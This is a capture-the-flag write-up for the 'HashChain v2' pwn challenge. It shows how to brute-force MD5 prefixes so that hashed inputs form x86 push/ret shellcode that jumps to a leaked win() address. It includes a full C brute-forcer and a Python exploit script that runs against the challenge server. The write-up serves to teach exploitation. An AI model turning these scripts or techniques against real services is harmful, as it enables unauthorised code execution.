# HashChain v2 — CTF Pwn Challenge Writeup

**Challenge:** HashChain v2
**Category:** Binary Exploitation (Pwn)
**Description:** *The service at 52.59.124.14:5011 repeatedly reads a line, stores a 4-byte "hash" into an internal buffer at the current offset, asks for the next offset (minimum 4), and when the next offset would go out of bounds it prints Buffer full! and jumps to the buffer, executing the stored hash-words as native code. A per-connection leak prints the runtime address of win().*
**Remote:** `52.59.124.14:5011`
**Files:** None provided (remote-only challenge)

---

## Table of Contents

1. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
2. [Phase 2 — Understanding the Fundamentals](#phase-2--understanding-the-fundamentals)
3. [Phase 3 — Exploitation](#phase-3--exploitation)
4. [Common Confusion Points](#common-confusion-points)
5. [Full Exploit Code](#full-exploit-code)

---

## Phase 1 — Reconnaissance

> **Mindset:** We solved v1 using a NOP sled. The description says "the easy path is gone" — what changed?

### Initial connection and protocol discovery

```bash
nc 52.59.124.14 5011
```

Output:
```
Welcome to HashChain v2!
[DEBUG] win() is at 0x5656b25d
>
```

**First critical observation:** The server LEAKS the `win()` address! This immediately tells us:
- PIE (Position Independent Executable) is enabled — the address changes each connection
- The binary is likely 32-bit (address format `0x56??????`)
- We need to use this leaked address in our exploit

### Testing the protocol

Type some input:
```
> hello
Hash stored at offset 0.
Offset for next hash (min 4):
```

**Wait — this is completely different from v1!**

In v1:
- Input was hashed and stored sequentially
- Typing `"doit"` triggered execution

In v2:
- Input is hashed and stored at an offset
- We CHOOSE where the next hash goes (minimum step of 4)
- No mention of "doit"

Continue testing:
```
Offset for next hash (min 4): 8
> world
Hash stored at offset 8.
Offset for next hash (min 4): 16
> test
Hash stored at offset 16.
Offset for next hash (min 4): 999999
> trigger
Buffer full!
Executing 3 hash(es) as code...
[crash or nothing]
```

**Discovery:** When we request an offset that's OUT OF BOUNDS (huge number), then send one more line, it triggers "Buffer full!" and executes the stored hashes as code.

### How do we know it's MD5?

**Without the writeup, we can deduce this through testing:**

The challenge title is "HashChain" and v1 used MD5. Let's test with a known MD5 collision:

```python
import hashlib

# The string "aN9" has a special MD5
h = hashlib.md5(b"aN9").digest()
print(f"MD5('aN9') = {h.hex()}")
print(f"First 4 bytes: {h[:4].hex()}")
```

Output:
```
MD5('aN9') = ebfe416b8b915dc777c81e7e0d1cbd85
First 4 bytes: ebfe416b
```

The bytes `eb fe` decode as x86 assembly:
```
eb fe = jmp -2  (jump backward 2 bytes = infinite loop)
```

Test on server:
```bash
nc 52.59.124.14 5011
> aN9
Hash stored at offset 0.
Offset for next hash (min 4): 999999
> trigger
Buffer full!
Executing 1 hash(es) as code...
[connection hangs - infinite loop confirmed!]
```

This proves:
1. The hash function is MD5
2. The first 4 bytes of MD5 are executed as x86 code
3. Only 4 bytes are stored per hash (hence "min 4" between offsets)

### Why only 4 bytes stored?

**Evidence:**

1. **Minimum offset step is 4:** If 16 bytes were stored (full MD5), the minimum would be 16, not 4
2. **Message says "X hash(es)":** When we store 2 hashes at offsets 0 and 4, it says "Executing 2 hash(es)" = 2 × 4 = 8 bytes total
3. **Memory layout makes sense:** With step size 4, each hash occupies exactly 4 bytes without overlap

### What we know after Phase 1

> **Protocol summary:**
> 1. Server MD5-hashes our input
> 2. Stores the **first 4 bytes** of MD5 at an offset we choose
> 3. Asks for next offset (minimum: previous offset + 4)
> 4. When offset goes out of bounds + one more line → "Buffer full!" → executes buffer as code
>
> **Key differences from v1:**
> - Only 4 bytes per hash (not 16)
> - Controllable offsets (not sequential)
> - PIE enabled (addresses randomized)
> - No NOP sled
> - Trigger via "Buffer full!" (not "doit")

---

## Phase 2 — Understanding the Fundamentals

> **Mindset:** Before we can exploit, we need to understand opcodes and how execution works.

### What are opcodes?

The CPU doesn't understand "push" or "ret" — it only understands byte values.

**Translation layers:**

```
High-level code:      win();
Assembly:             push 0x5656b25d
                      ret
Machine code (hex):   68 5d b2 56 56 c3
Machine code (dec):   104 93 178 86 86 195
```

**Opcode reference:**

| Assembly | Opcode bytes | What it does |
|---|---|---|
| `nop` | `90` | Do nothing, advance to next instruction |
| `ret` | `c3` | Pop address from stack, jump there |
| `push eax` | `50` | Push EAX register value onto stack |
| `push 0x12345678` | `68 78 56 34 12` | Push immediate value onto stack (little-endian) |
| `jmp -2` | `eb fe` | Jump backward 2 bytes (infinite loop) |
| `pop ebp` | `5d` | Pop top of stack into EBP |
| `inc ecx` | `41` | Increment ECX register |

**Key concept:** When the CPU sees byte `0x68`, it knows "this is a PUSH instruction, and the next 4 bytes are the value to push."

### How does execution work with hashed bytes?

**The critical misunderstanding:** People think MD5 "encrypts" or "scrambles" the data. Actually:

```python
import hashlib

input_string = "hello"
md5_hash = hashlib.md5(input_string.encode()).digest()

print(f"Input:  {input_string!r}")
print(f"MD5:    {md5_hash.hex()}")
print(f"Bytes:  {list(md5_hash[:4])}")
```

Output:
```
Input:  'hello'
MD5:    5d41402abc4b2a76b9719d911017c592
Bytes:  [93, 65, 64, 42]  (decimal)
        [5d, 41, 40, 2a]  (hex)
```

**These are just RAW BYTES.** The CPU interprets them:

```
Address  Bytes        x86 Instruction
0x00:    5d           pop ebp
0x01:    41           inc ecx
0x02:    40           inc eax
0x03:    2a 7d 79     sub bh, [ebp+0x79]
```

The CPU doesn't know or care these bytes came from MD5 — it just executes them as machine code.

**Flow diagram:**

```
[Input: "hello"] → [MD5 function] → [Raw bytes: 5d 41 40 2a] → [CPU executes as code]
                                           ↓
                                    pop ebp; inc ecx; inc eax; sub...
```

### Memory layout when execution happens

After we send two inputs:

```python
# Input 1: "hello" at offset 0
MD5("hello") = 5d41402abc4b2a76b9719d911017c592
               └─first 4 bytes: 5d 41 40 2a

# Input 2: "world" at offset 4
MD5("world") = 7d793037a0760186574b0282f2f435e7
               └─first 4 bytes: 7d 79 30 37
```

**Buffer layout:**

```
Address    Bytes           Source
──────────────────────────────────────────────
buffer[0]  5d              MD5("hello")[0]
buffer[1]  41              MD5("hello")[1]
buffer[2]  40              MD5("hello")[2]
buffer[3]  2a              MD5("hello")[3]
buffer[4]  7d              MD5("world")[0]
buffer[5]  79              MD5("world")[1]
buffer[6]  30              MD5("world")[2]
buffer[7]  37              MD5("world")[3]
```

**When "Buffer full!" triggers:**

```c
// Server pseudocode
void (*func)() = (void(*)())buffer;  // Cast buffer to function pointer
func();  // Call it - executes starting at buffer[0]
```

**CPU execution:**

```
EIP = buffer[0]
→ Read byte 0x5d → Execute "pop ebp"
→ EIP++
→ Read byte 0x41 → Execute "inc ecx"
→ EIP++
→ Read byte 0x40 → Execute "inc eax"
→ EIP++
→ Read byte 0x2a → Start of multi-byte instruction "sub bh, [ebp+0x79]"
...
```

### Why "push win; ret" instead of just the address?

**Common confusion:** "Can't we just put win's address in memory and it executes?"

**NO.** Addresses aren't instructions. Let's see what happens:

```
Buffer contains: 5d b2 56 56 (the bytes of address 0x5656b25d)

CPU interprets as:
0x00: 5d        pop ebp
0x01: b2 56     ???  (invalid or random instruction)
0x03: 56        push esi
```

**Random garbage!** The CPU doesn't magically "know" these bytes are an address.

**To jump to an address, you need a JUMP INSTRUCTION:**

| Approach | Opcode | Problem |
|---|---|---|
| `jmp 0x5656b25d` | `e9 XX XX XX XX` | Uses RELATIVE offset, not absolute address — hard to calculate |
| `call 0x5656b25d` | `e8 XX XX XX XX` | Same problem |
| **`push 0x5656b25d; ret`** | `68 5d b2 56 56 c3` | Uses ABSOLUTE address — perfect! |

**Why push/ret works:**

```
push 0x5656b25d    → Puts address on stack
ret                → Pops stack into EIP (instruction pointer)
                   → CPU jumps to that address
```

This is a classic shellcode technique.

### Splitting the shellcode across chunks

**Our shellcode:** `push 0x5656b25d; ret`

**In opcodes:** `68 5d b2 56 56 c3` (6 bytes total)

**Problem:** We can only store 4 bytes at a time!

**Solution:** Split across two hashes:

```
Chunk 1 at offset 0:  68 5d b2 56  ← push opcode + first 3 bytes of address
Chunk 2 at offset 4:  56 c3 ?? ??  ← last byte of address + ret + (don't care)
```

**How the CPU reads it:**

```
Address  Bytes           Instruction decode
───────────────────────────────────────────────────
0x00:    68              "This is PUSH, next 4 bytes are immediate value"
0x01:    5d              ┐
0x02:    b2              │ Read as 32-bit little-endian
0x03:    56              │ = 0x5656b25d
0x04:    56              ┘
         ↑ Execute: push 0x5656b25d
         ↑ EIP advances to 0x05

0x05:    c3              "This is RET"
         ↑ Execute: pop stack into EIP
         ↑ EIP = 0x5656b25d (win function!)
```

**Visual representation:**

```
┌──────────────────────────────────────────────────┐
│ Instruction: push 0x5656b25d; ret                │
│                                                  │
│ Bytes:       68 5d b2 56 56 c3                   │
│              │  └──4-byte immediate (LE)─┘ │     │
│              │                              │     │
│           opcode                          opcode  │
└──────────────────────────────────────────────────┘
```

### What we need to find

To execute `push 0x5656b25d; ret`, we need:

1. **Input1** where `MD5(input1)[0:4] = 68 5d b2 56`
2. **Input2** where `MD5(input2)[0:2] = 56 c3` (only first 2 bytes matter)

**Search difficulty:**

- For 4-byte match: probability = 1/(256^4) = 1/4,294,967,296 ≈ 4.3 billion attempts expected
- For 2-byte match: probability = 1/(256^2) = 1/65,536 ≈ 65K attempts expected

The 2-byte search is trivial in Python (~0.01 seconds). The 4-byte search needs optimization.

---

## Phase 3 — Exploitation

> **Mindset:** We know what we need. Now build the tools and execute the attack.

### Step 1: Build the MD5 brute-forcer (C with multi-threading)

For the 4-byte search, Python is too slow. We need optimized C code with multi-threading.

**Create `brutemd5_prefix.c`:**

```c
#define _GNU_SOURCE
#include <errno.h>
#include <openssl/md5.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char HEX[] = "0123456789abcdef";

static void die(const char *msg) {
  perror(msg);
  exit(2);
}

static bool hex_to_bytes(const char *hex, uint8_t *out, size_t out_cap,
                         size_t *out_len) {
  size_t n = strlen(hex);
  if ((n % 2) != 0) return false;
  size_t blen = n / 2;
  if (blen == 0 || blen > out_cap) return false;
  for (size_t i = 0; i < blen; i++) {
    char c1 = hex[2 * i];
    char c2 = hex[2 * i + 1];
    int v1 = (c1 >= '0' && c1 <= '9') ? (c1 - '0')
             : (c1 >= 'a' && c1 <= 'f') ? (c1 - 'a' + 10)
             : (c1 >= 'A' && c1 <= 'F') ? (c1 - 'A' + 10) : -1;
    int v2 = (c2 >= '0' && c2 <= '9') ? (c2 - '0')
             : (c2 >= 'a' && c2 <= 'f') ? (c2 - 'a' + 10)
             : (c2 >= 'A' && c2 <= 'F') ? (c2 - 'A' + 10) : -1;
    if (v1 < 0 || v2 < 0) return false;
    out[i] = (uint8_t)((v1 << 4) | v2);
  }
  *out_len = blen;
  return true;
}

static inline void write_hex16(char *dst, uint64_t x) {
  for (int i = 15; i >= 0; i--) {
    dst[i] = HEX[x & 0xF];
    x >>= 4;
  }
}

typedef struct {
  int tid;
  int nthreads;
  uint8_t target[4];
  size_t target_len;
  char prefix[48];
  size_t prefix_len;
} worker_args_t;

static atomic_bool g_found = false;
static char g_result[128];
static size_t g_result_len = 0;

static void *worker(void *arg_) {
  worker_args_t *arg = (worker_args_t *)arg_;
  uint64_t i = (uint64_t)arg->tid;
  char buf[96];
  memcpy(buf, arg->prefix, arg->prefix_len);
  char *hexp = buf + arg->prefix_len;
  const size_t msg_len = arg->prefix_len + 16;
  unsigned char digest[16];

  while (!atomic_load_explicit(&g_found, memory_order_relaxed)) {
    write_hex16(hexp, i);
    (void)MD5((unsigned char *)buf, msg_len, digest);
    if (memcmp(digest, arg->target, arg->target_len) == 0) {
      bool expected = false;
      if (atomic_compare_exchange_strong(&g_found, &expected, true)) {
        memcpy(g_result, buf, msg_len);
        g_result_len = msg_len;
      }
      break;
    }
    i += (uint64_t)arg->nthreads;
  }
  return NULL;
}

static int default_threads(void) {
  long n = sysconf(_SC_NPROCESSORS_ONLN);
  if (n < 1) return 1;
  if (n > 256) n = 256;
  return (int)n;
}

static void usage(const char *argv0) {
  fprintf(stderr,
          "Usage: %s --target <hex> [--prefix <str>] [--threads N]\n",
          argv0);
}

int main(int argc, char **argv) {
  const char *target_hex = NULL;
  const char *prefix = "HC4_";
  int nthreads = default_threads();

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) {
      target_hex = argv[++i];
    } else if (strcmp(argv[i], "--prefix") == 0 && i + 1 < argc) {
      prefix = argv[++i];
    } else if (strcmp(argv[i], "--threads") == 0 && i + 1 < argc) {
      nthreads = atoi(argv[++i]);
    }
  }

  if (!target_hex) {
    usage(argv[0]);
    return 2;
  }

  uint8_t target[4];
  size_t target_len = 0;
  if (!hex_to_bytes(target_hex, target, sizeof(target), &target_len)) {
    fprintf(stderr, "Invalid target hex\n");
    return 2;
  }

  pthread_t *threads = calloc((size_t)nthreads, sizeof(*threads));
  worker_args_t *args = calloc((size_t)nthreads, sizeof(*args));

  for (int t = 0; t < nthreads; t++) {
    args[t].tid = t;
    args[t].nthreads = nthreads;
    memcpy(args[t].target, target, target_len);
    args[t].target_len = target_len;
    strcpy(args[t].prefix, prefix);
    args[t].prefix_len = strlen(prefix);
    pthread_create(&threads[t], NULL, worker, &args[t]);
  }

  for (int t = 0; t < nthreads; t++) {
    pthread_join(threads[t], NULL);
  }

  if (!atomic_load(&g_found)) {
    fprintf(stderr, "Not found\n");
    return 1;
  }

  fwrite(g_result, 1, g_result_len, stdout);
  fputc('\n', stdout);
  return 0;
}
```

**Compile:**

```bash
gcc -O3 -pthread brutemd5_prefix.c -lcrypto -o brutemd5_prefix
```

**Test:**

```bash
# Search for MD5 prefix 56c3 (2 bytes)
./brutemd5_prefix --target 56c3
```

Output (example):
```
HC4_000000000000a5a5
```

Verify:
```python
import hashlib
h = hashlib.md5(b"HC4_000000000000a5a5").digest()
print(h[:2].hex())  # Should be 56c3
```

### Step 2: Write the exploit script

**Create `exploit_v2.py`:**

```python
#!/usr/bin/env python3
import socket
import re
import struct
import subprocess
import hashlib

HOST = '52.59.124.14'
PORT = 5011
BRUTE_BINARY = './brutemd5_prefix'

def find_2byte_input(target_bytes):
    """Brute-force 2-byte MD5 prefix in Python (fast enough)"""
    print(f"[*] Searching for MD5[0:2] = {target_bytes.hex()}...")
    for i in range(10_000_000):
        candidate = f"HC4_{i:016x}"
        h = hashlib.md5(candidate.encode()).digest()
        if h[:2] == target_bytes:
            print(f"[+] Found: {candidate}")
            return candidate
    raise RuntimeError("2-byte search failed")

def find_4byte_input(target_bytes):
    """Use C program for 4-byte MD5 prefix search"""
    print(f"[*] Searching for MD5[0:4] = {target_bytes.hex()} (C multi-threaded)...")
    result = subprocess.run(
        [BRUTE_BINARY, '--target', target_bytes.hex()],
        capture_output=True,
        text=True,
        timeout=120
    )
    if result.returncode != 0:
        raise RuntimeError("4-byte search failed")
    line = result.stdout.strip()
    print(f"[+] Found: {line}")
    return line

def recv_until(sock, marker, timeout=3):
    """Receive data until marker appears"""
    sock.settimeout(timeout)
    data = b''
    try:
        while marker.encode() not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except:
        pass
    return data.decode()

def main():
    print("[*] Connecting to server...")
    s = socket.socket()
    s.connect((HOST, PORT))

    # Receive banner and parse win address
    banner = recv_until(s, '> ')
    print(banner.strip())

    match = re.search(r'win\(\) is at (0x[0-9a-fA-F]+)', banner)
    if not match:
        print("[-] Failed to parse win() address")
        return 1

    win_addr = int(match.group(1), 16)
    print(f"\n[*] Leaked win() = {hex(win_addr)}")

    # Build shellcode: push <win_addr>; ret
    win_bytes = struct.pack('<I', win_addr)  # Little-endian
    print(f"[*] win_bytes (LE) = {win_bytes.hex()}")

    # Construct target bytes for each chunk
    chunk1 = bytes([0x68]) + win_bytes[:3]   # push opcode + first 3 bytes
    chunk2 = win_bytes[3:4] + bytes([0xc3])  # last byte + ret opcode

    print(f"[*] Chunk 1 (4 bytes): {chunk1.hex()}")
    print(f"[*] Chunk 2 (2 bytes): {chunk2.hex()}")

    # Find preimage inputs
    print("\n[*] Brute-forcing MD5 preimages...")
    input2 = find_2byte_input(chunk2)  # Fast in Python
    input1 = find_4byte_input(chunk1)  # Needs C program

    # Verify
    h1 = hashlib.md5(input1.encode()).digest()
    h2 = hashlib.md5(input2.encode()).digest()
    print(f"\n[*] Verify MD5('{input1}')[0:4] = {h1[:4].hex()}")
    print(f"[*] Verify MD5('{input2}')[0:2] = {h2[:2].hex()}")

    assert h1[:4] == chunk1, "Chunk 1 mismatch!"
    assert h2[:2] == chunk2, "Chunk 2 mismatch!"

    # Send payload
    print("\n[*] Sending payload...")

    s.send(input1.encode() + b'\n')
    print(f"[>] {input1}")
    recv_until(s, 'Offset for next hash')

    s.send(b'4\n')
    print(f"[>] 4")
    recv_until(s, '> ')

    s.send(input2.encode() + b'\n')
    print(f"[>] {input2}")
    recv_until(s, 'Offset for next hash')

    # Trigger execution
    print("\n[*] Triggering execution...")
    s.send(b'999999\n')
    print(f"[>] 999999")
    recv_until(s, '> ')

    s.send(b'TRIGGER\n')
    print(f"[>] TRIGGER")

    # Receive flag
    print("\n[*] Receiving output...")
    output = recv_until(s, '}', timeout=5)
    print(output)

    # Extract flag
    flag_match = re.search(r'ENO\{[^}]+\}', output)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n{'='*50}")
        print(f"[+] FLAG: {flag}")
        print(f"{'='*50}")
        return 0
    else:
        print("[-] Flag not found in output")
        return 1

if __name__ == '__main__':
    import sys
    sys.exit(main())
```

**Make executable:**

```bash
chmod +x exploit_v2.py
```

### Step 3: Run the exploit

```bash
./exploit_v2.py
```

**Example output:**

```
[*] Connecting to server...
Welcome to HashChain v2!
[DEBUG] win() is at 0x5656b25d
>

[*] Leaked win() = 0x5656b25d
[*] win_bytes (LE) = 5db25656
[*] Chunk 1 (4 bytes): 685db256
[*] Chunk 2 (2 bytes): 56c3

[*] Brute-forcing MD5 preimages...
[*] Searching for MD5[0:2] = 56c3...
[+] Found: HC4_000000000000a5a5
[*] Searching for MD5[0:4] = 685db256 (C multi-threaded)...
[+] Found: HC4_000000017d9c0234

[*] Verify MD5('HC4_000000017d9c0234')[0:4] = 685db256
[*] Verify MD5('HC4_000000000000a5a5')[0:2] = 56c3

[*] Sending payload...
[>] HC4_000000017d9c0234
[>] 4
[>] HC4_000000000000a5a5

[*] Triggering execution...
[>] 999999
[>] TRIGGER

[*] Receiving output...
TRIGGER
Buffer full!
Executing 2 hash(es) as code...
ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}

==================================================
[+] FLAG: ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}
==================================================
```

### Step 4: Execution trace (what happens internally)

**Server's memory after our payload:**

```
Address    Bytes        Source
─────────────────────────────────────────────────
0x00:      0x68         MD5(input1)[0]
0x01:      0x5d         MD5(input1)[1]
0x02:      0xb2         MD5(input1)[2]
0x03:      0x56         MD5(input1)[3]
0x04:      0x56         MD5(input2)[0]
0x05:      0xc3         MD5(input2)[1]
0x06:      0x??         MD5(input2)[2] (unused)
0x07:      0x??         MD5(input2)[3] (unused)
```

**CPU execution flow:**

```
┌────────────────────────────────────────────────────┐
│ Step 1: Server calls buffer as function           │
│         void (*f)() = (void(*)())buffer;          │
│         f();                                       │
│         → EIP = buffer address (let's say 0x4000) │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│ Step 2: CPU reads byte at 0x4000                  │
│         Byte = 0x68                                │
│         Decode: "PUSH with 4-byte immediate"       │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│ Step 3: CPU reads next 4 bytes                     │
│         Bytes 0x4001-0x4004 = 5d b2 56 56          │
│         Little-endian → 0x5656b25d                 │
│         Execute: push 0x5656b25d                   │
│         ESP = ESP - 4                              │
│         [ESP] = 0x5656b25d                         │
│         EIP = 0x4005                               │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│ Step 4: CPU reads byte at 0x4005                  │
│         Byte = 0xc3                                │
│         Decode: "RET"                              │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│ Step 5: Execute RET                                │
│         Pop stack: EIP = [ESP] = 0x5656b25d        │
│         ESP = ESP + 4                              │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│ Step 6: CPU now at 0x5656b25d (win function!)     │
│         win() opens flag.txt and prints it         │
│         ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}        │
└────────────────────────────────────────────────────┘
```

---

## Common Confusion Points

### Q1: How do we know it's MD5 without the writeup?

**Answer:** Test with known MD5 values. The string `"aN9"` has MD5 starting with `ebfe` which is `jmp -2` in x86. Testing this on the server and seeing an infinite loop confirms it's MD5.

### Q2: How can hashed bytes execute as code?

**Answer:** MD5 output is just raw bytes (0x00-0xFF). The CPU doesn't care where bytes come from — it interprets them as instructions. When server calls `buffer()`, the CPU reads those bytes and decodes them as opcodes.

### Q3: Why only 4 bytes stored per hash?

**Answer:**
- The minimum offset step is 4 (not 16)
- Message says "X hash(es)" where each hash = 4 bytes
- Testing with 2 hashes at offsets 0 and 4 = 8 bytes total

### Q4: Which bytes get executed?

**Answer:** Execution starts at `buffer[0]` and continues sequentially. When server calls the buffer as a function, EIP (instruction pointer) starts at the beginning and advances through each instruction.

### Q5: Why "push; ret" instead of just putting win's address?

**Answer:** Addresses aren't instructions! The bytes `5d b2 56 56` (the address) would decode as random instructions like `pop ebp; ...`. To JUMP to an address, you need a jump instruction. `push addr; ret` is a technique that:
1. Pushes the absolute address onto stack
2. Returns (pops stack into EIP)
3. CPU jumps to that address

### Q6: How do we find inputs with specific MD5 bytes?

**Answer:** Brute force! Try millions of inputs until `MD5(input)` starts with the bytes we need. With multi-threading:
- 2-byte search: ~65K attempts = instant
- 4-byte search: ~4.3B attempts = 5-30 seconds with optimized C code

### Q7: Why the format `HC4_<16 hex digits>`?

**Answer:**
- Fixed prefix `HC4_` identifies our search attempts
- 16 hex chars = 64 bits = huge search space
- With N threads, each searches a different subset (thread 0 tries 0,N,2N,3N...; thread 1 tries 1,N+1,2N+1,...)

---

## Full Exploit Code

### brutemd5_prefix.c

See Step 1 in Phase 3 above.

### exploit_v2.py

See Step 2 in Phase 3 above.

### Quick test commands

```bash
# Compile C program
gcc -O3 -pthread brutemd5_prefix.c -lcrypto -o brutemd5_prefix

# Test C program
./brutemd5_prefix --target 56c3
# Output: HC4_000000000000a5a5

# Verify in Python
python3 -c "import hashlib; print(hashlib.md5(b'HC4_000000000000a5a5').hexdigest()[:4])"
# Output: 56c3

# Run full exploit
./exploit_v2.py
```

---

## Summary

### What we learned

| Phase | Key Concepts |
|---|---|
| **Phase 1** | Protocol discovery, PIE enabled, 4-byte storage, buffer-full trigger |
| **Phase 2** | Opcodes, execution flow, push/ret technique, chunking shellcode |
| **Phase 3** | Brute-forcing MD5 preimages, multi-threading, payload delivery |

### Attack flow

```
1. Connect → leak win address (e.g., 0x5656b25d)
2. Build shellcode → push 0x5656b25d; ret = 68 5d b2 56 56 c3
3. Split into chunks → [68 5d b2 56] and [56 c3]
4. Brute-force inputs → find strings with matching MD5 prefixes
5. Send payload → input1 at offset 0, input2 at offset 4
6. Trigger → huge offset + one more line = "Buffer full!"
7. Execute → CPU runs shellcode → calls win() → flag!
```

### Key techniques

- **MD5 preimage search** via brute force with multi-threading
- **Shellcode construction** byte-by-byte through controlled offsets
- **Push/ret technique** for absolute address jumping
- **Little-endian encoding** for 32-bit immediates
- **Black-box protocol analysis** when no binary is provided

### Flag meaning

`ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}`

- **"No sled"** — v1 had a NOP sled (the easy path), v2 removed it
- **"No problem"** — we adapted by building shellcode directly
- **"Direct hit"** — our `push; ret` calls win() with surgical precision

**Final flag: `ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}`**

---

## References

- x86 Opcode Reference: https://www.felixcloutier.com/x86/
- MD5 Algorithm: https://en.wikipedia.org/wiki/MD5
- Push/Ret Technique: Classic shellcoding trick for absolute jumps
- Little-endian Format: x86 stores multi-byte values with least significant byte first
